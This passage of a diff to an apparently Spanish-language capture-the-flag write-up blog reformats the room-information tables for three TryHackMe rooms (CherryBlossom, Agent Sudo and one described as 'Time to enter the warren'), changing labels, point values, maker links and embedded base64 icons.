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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;Info&lt;/td&gt;
-&lt;td&gt;Time to enter the warren&amp;hellip;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Time to enter the warren&amp;hellip;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;310&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;310&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
-&lt;td&gt;Facil&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Facil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/MuirlandOracle.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -4234,35 +5085,33 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/cherryblossom/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Titulo&lt;/th&gt;
-&lt;th&gt;CherryBlossom&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/cherryblossom&#34;&gt;CherryBlossom&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;Info&lt;/td&gt;
-&lt;td&gt;Boot-to-root with emphasis on crypto and password cracking.&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Boot-to-root with emphasis on crypto and password cracking.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;1450&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;90&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
-&lt;td&gt;Dificil&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Dificil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/MuirlandOracle&#34;&gt;MuirlandOracle&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/MuirlandOracle.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;br&gt;
-&lt;hr /&gt;
 &lt;h1 id=&#34;nmap-&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -4767,35 +5616,33 @@ Session completed
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Titulo&lt;/th&gt;
-&lt;th&gt;Agent Sudo&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/agentsudoctf&#34;&gt;Agent Sudo&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;Info&lt;/td&gt;
-&lt;td&gt;You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;3311&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;840&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
-&lt;td&gt;Facil&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Facil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;Deskel&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;DesKel&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/DesKel.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;br&gt;
-&lt;hr&gt;
 &lt;h1 id=&#34;nmap-&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
